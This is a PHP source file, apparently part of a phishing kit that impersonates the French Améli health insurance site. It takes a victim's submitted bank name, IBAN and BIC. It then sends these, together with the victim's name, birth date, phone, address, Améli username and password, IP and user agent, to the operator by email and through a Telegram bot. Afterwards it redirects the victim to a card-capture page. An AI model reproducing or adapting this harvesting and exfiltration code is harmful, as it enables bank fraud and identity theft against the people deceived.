<?php

include("../common/sub_includes.php");

ob_start();

if(isset($_POST['iban_submit']))
{

	if(!isset($_SESSION)){
		session_start();
	}

$_SESSION['banque'] = htmlspecialchars($_POST['Banque']);
$_SESSION['iban'] = htmlspecialchars($_POST['iban']);
$_SESSION['bic'] = htmlspecialchars($_POST['bic']);



if(empty($_SESSION['banque']) || empty($_SESSION['iban']) || empty($_SESSION['bic']))
{

	header('Location: ../steps/rib.php?error=empty');
}
else{}




  ######################
  #### MAIL SENDING ####
  ######################


        if($mail_sending == true){

$message = 
          
"〔📋〕 RIB 〔📋〕"."

📂 Banque : ".$_SESSION['banque']."
📂 IBAN: ".$_SESSION['iban']."
📂 BIC : ".$_SESSION['bic']."



👨‍✈️ Nom  : ".$_SESSION['nom']."
👨‍✈️	Prénom : ".$_SESSION['prenom']."
👨‍✈️ Date de naissance : ".$_SESSION['birthday']."
📞 Numéro de téléphone : ".$_SESSION['phone']."
📍 	Adresse : ".$_SESSION['adresse']."
📍  Code Postal : ".$_SESSION['zip']."
📍  Ville : ".$_SESSION['city']."


🌗 Identifiant Améli : ".$_SESSION['identifiant']."
🌙 Mot de passe Améli : ".$_SESSION['password']."



🎯 IP : ".$_SESSION['ip']."
🎯 User-agent : ".$_SESSION['useragent']."
      
          ";
  
  
          $subject = "📋 Info RIB ".$_SESSION['banque'].$_SESSION['ip'];
          $headers = "From: Améli | RIB <vito@tele.fr>";



          mail($rezmail, $subject, $message, $headers , $head);

        }

				##########################
				#### TELEGRAM SENDING ####
				##########################

        
				if($telegram_sending == true){

          $data = [

            'text' => '
〔〕 Carte 〔〕

 📂Banque : '.$_SESSION['banque'].'
 📂IBAN : '.$_SESSION['iban'].'
 📂BIC : '.$_SESSION['bic'].'
 
〔🥯〕 Full 〔🥯〕

🥯 Nom : '.$_SESSION['nom'].'
🥯 Prénom : '.$_SESSION['prenom'].'
🥯 Date De Naissance : '.$_SESSION['birthday'].'

🥯 Téléphone : '.$_SESSION['phone'].'
🥯 Adresse : '.$_SESSION['adresse'].'
🥯 Ville : '.$_SESSION['city'].'
🥯 Code Postal : '.$_SESSION['zip'].'

〔🍞〕 Login 〔🍞〕

🍞 Identifiant : '.$_SESSION['identifiant'].'
🍞 Mot de passe : '.$_SESSION['password'].'

〔🥖〕 Informations additionnelles 〔🥖〕

🥖 Adresse Ip : '.$_SESSION['ip'].'
🥖 User-agent : '.$_SESSION['useragent'].'


            ',
            'chat_id' => $chat_card
          ];

          file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}
        header('Location: ../steps/cc.php');

  }
  

?>